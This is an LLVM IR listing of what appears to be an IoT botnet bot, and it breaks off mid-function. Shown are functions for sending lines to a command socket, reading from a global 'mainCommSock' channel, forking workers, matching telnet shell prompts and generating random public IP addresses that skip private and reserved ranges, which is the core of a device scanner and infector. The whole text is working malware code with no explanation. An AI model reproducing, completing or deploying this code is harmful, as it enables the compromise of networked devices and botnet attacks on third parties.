declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #7
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.261, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #14
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #7
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #7
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #2

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #8 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #14
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #14
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #7
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #4 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #7, !srcloc !14
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.fd_set* nonnull %4, %struct.fd_set* null, %struct.fd_set* nonnull %4, %struct.timeval* nonnull %tmpcast) #7
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @mainCommSock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #7
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #7
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #7
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #15
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #7, !srcloc !15
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.fd_set* null, %struct.fd_set* nonnull %6, %struct.fd_set* null, %struct.timeval* nonnull %7) #7
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #7
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #7
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #7
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #7
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #7
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #2

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #8 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #14
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext41 = shl i64 %1, 32
  %5 = ashr exact i64 %sext41, 32
  %6 = icmp sgt i32 %2, 0
  br i1 %6, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %7 = icmp sgt i32 %2, %.1.lcssa
  br i1 %7, label %.lr.ph.1.preheader, label %.critedge.1

.lr.ph.1.preheader:                               ; preds = %.preheader.137
  br label %.lr.ph.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %12, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %8 = sub nsw i64 0, %indvars.iv
  %9 = getelementptr inbounds i8, i8* %4, i64 %8
  %10 = load i8, i8* %9, align 1
  %11 = trunc i64 %indvars.iv to i32
  switch i8 %10, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %12 = add nsw i32 %.130, 1
  %13 = icmp sgt i64 %5, %indvars.iv.next
  br i1 %13, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %11, %.lr.ph ], [ %12, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %14 = sext i32 %.1.lcssa to i64
  %15 = sub nsw i64 0, %14
  %16 = getelementptr inbounds i8, i8* %4, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 58
  br i1 %18, label %19, label %.preheader.137

; <label>:19:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.1:                                         ; preds = %.lr.ph.1.preheader, %.critedge1.1
  %indvars.iv.1 = phi i64 [ %indvars.iv.next.1, %.critedge1.1 ], [ %14, %.lr.ph.1.preheader ]
  %.130.1 = phi i32 [ %24, %.critedge1.1 ], [ %.1.lcssa, %.lr.ph.1.preheader ]
  %20 = sub nsw i64 0, %indvars.iv.1
  %21 = getelementptr inbounds i8, i8* %4, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = trunc i64 %indvars.iv.1 to i32
  switch i8 %22, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %24 = add nsw i32 %.130.1, 1
  %25 = icmp sgt i64 %5, %indvars.iv.next.1
  br i1 %25, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %23, %.lr.ph.1 ], [ %24, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %26 = sext i32 %.1.lcssa.1 to i64
  %27 = sub nsw i64 0, %26
  %28 = getelementptr inbounds i8, i8* %4, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 62
  br i1 %30, label %19, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %31 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %31, label %.lr.ph.2.preheader, label %.critedge.2

.lr.ph.2.preheader:                               ; preds = %.preheader.238
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.lr.ph.2.preheader, %.critedge1.2
  %indvars.iv.2 = phi i64 [ %indvars.iv.next.2, %.critedge1.2 ], [ %26, %.lr.ph.2.preheader ]
  %.130.2 = phi i32 [ %36, %.critedge1.2 ], [ %.1.lcssa.1, %.lr.ph.2.preheader ]
  %32 = sub nsw i64 0, %indvars.iv.2
  %33 = getelementptr inbounds i8, i8* %4, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = trunc i64 %indvars.iv.2 to i32
  switch i8 %34, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %36 = add nsw i32 %.130.2, 1
  %37 = icmp sgt i64 %5, %indvars.iv.next.2
  br i1 %37, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %35, %.lr.ph.2 ], [ %36, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %38 = sext i32 %.1.lcssa.2 to i64
  %39 = sub nsw i64 0, %38
  %40 = getelementptr inbounds i8, i8* %4, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = icmp eq i8 %41, 37
  br i1 %42, label %19, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %43 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %43, label %.lr.ph.3.preheader, label %.critedge.3

.lr.ph.3.preheader:                               ; preds = %.preheader.339
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.lr.ph.3.preheader, %.critedge1.3
  %indvars.iv.3 = phi i64 [ %indvars.iv.next.3, %.critedge1.3 ], [ %38, %.lr.ph.3.preheader ]
  %.130.3 = phi i32 [ %48, %.critedge1.3 ], [ %.1.lcssa.2, %.lr.ph.3.preheader ]
  %44 = sub nsw i64 0, %indvars.iv.3
  %45 = getelementptr inbounds i8, i8* %4, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = trunc i64 %indvars.iv.3 to i32
  switch i8 %46, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %48 = add nsw i32 %.130.3, 1
  %49 = icmp sgt i64 %5, %indvars.iv.next.3
  br i1 %49, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %47, %.lr.ph.3 ], [ %48, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %50 = sext i32 %.1.lcssa.3 to i64
  %51 = sub nsw i64 0, %50
  %52 = getelementptr inbounds i8, i8* %4, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = icmp eq i8 %53, 36
  br i1 %54, label %19, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %55 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %55, label %.lr.ph.4.preheader, label %.critedge.4

.lr.ph.4.preheader:                               ; preds = %.preheader.440
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.lr.ph.4.preheader, %.critedge1.4
  %indvars.iv.4 = phi i64 [ %indvars.iv.next.4, %.critedge1.4 ], [ %50, %.lr.ph.4.preheader ]
  %.130.4 = phi i32 [ %60, %.critedge1.4 ], [ %.1.lcssa.3, %.lr.ph.4.preheader ]
  %56 = sub nsw i64 0, %indvars.iv.4
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = trunc i64 %indvars.iv.4 to i32
  switch i8 %58, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %60 = add nsw i32 %.130.4, 1
  %61 = icmp sgt i64 %5, %indvars.iv.next.4
  br i1 %61, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %59, %.lr.ph.4 ], [ %60, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %62 = sext i32 %.1.lcssa.4 to i64
  %63 = sub nsw i64 0, %62
  %64 = getelementptr inbounds i8, i8* %4, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = icmp eq i8 %65, 35
  %. = zext i1 %66 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #7
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* @getRandomPublicIP.ipState.0, align 1
  %5 = tail call i32 @rand() #7
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* @getRandomPublicIP.ipState.1, align 1
  %8 = tail call i32 @rand() #7
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* @getRandomPublicIP.ipState.2, align 1
  %11 = tail call i32 @rand() #7
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* @getRandomPublicIP.ipState.3, align 1
  %14 = load i8, i8* @getRandomPublicIP.ipState.0, align 1
  switch i8 %14, label %22 [
    i8 0, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 100, label %15
    i8 127, label %.critedge.backedge
    i8 -87, label %19
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge, %.critedge, %19, %15, %22, %27, %32, %43, %46, %40
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %17 = icmp ugt i8 %16, 63
  %18 = icmp sgt i8 %16, -1
  %or.cond = and i1 %17, %18
  br i1 %or.cond, label %.critedge.backedge, label %.thread42

.thread42:                                        ; preds = %15
  %.pre43 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  br label %.thread45

; <label>:19:                                     ; preds = %.critedge
  %20 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %21 = icmp eq i8 %20, -2
  br i1 %21, label %.critedge.backedge, label %.thread45

; <label>:22:                                     ; preds = %.critedge
  %.pre = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %23 = icmp eq i8 %14, -84
  %24 = icmp ult i8 %.pre, 17
  %or.cond18 = and i1 %23, %24
  br i1 %or.cond18, label %.critedge.backedge, label %27

.thread45:                                        ; preds = %.thread42, %19
  %.ph = phi i8 [ %.pre43, %.thread42 ], [ %20, %19 ]
  %25 = icmp eq i8 %.ph, 0
  %26 = load i8, i8* @getRandomPublicIP.ipState.2, align 1
  br label %32

; <label>:27:                                     ; preds = %22
  %28 = icmp eq i8 %14, -64
  %29 = icmp eq i8 %.pre, 0
  %or.cond20 = and i1 %28, %29
  %30 = load i8, i8* @getRandomPublicIP.ipState.2, align 1
  %31 = icmp eq i8 %30, 2
  %or.cond22 = and i1 %or.cond20, %31
  br i1 %or.cond22, label %.critedge.backedge, label %32

; <label>:32:                                     ; preds = %.thread45, %27
  %33 = phi i8 [ %26, %.thread45 ], [ %30, %27 ]
  %34 = phi i1 [ %25, %.thread45 ], [ %29, %27 ]
  %35 = phi i1 [ false, %.thread45 ], [ %28, %27 ]
  %36 = phi i8 [ %.ph, %.thread45 ], [ %.pre, %27 ]
  %37 = icmp eq i8 %36, 88
  %or.cond24 = and i1 %35, %37
  %38 = icmp eq i8 %33, 99
  %or.cond26 = and i1 %or.cond24, %38
  %39 = icmp eq i8 %36, -88
  %or.cond28 = and i1 %35, %39
  %or.cond39 = or i1 %or.cond28, %or.cond26
  br i1 %or.cond39, label %.critedge.backedge, label %40

; <label>:40:                                     ; preds = %32
  %41 = icmp eq i8 %14, -58
  %42 = and i8 %36, -2
  %switch = icmp eq i8 %42, 18
  %or.cond40 = and i1 %41, %switch
  br i1 %or.cond40, label %.critedge.backedge, label %43

; <label>:43:                                     ; preds = %40
  %44 = icmp eq i8 %36, 51
  %or.cond30 = and i1 %41, %44
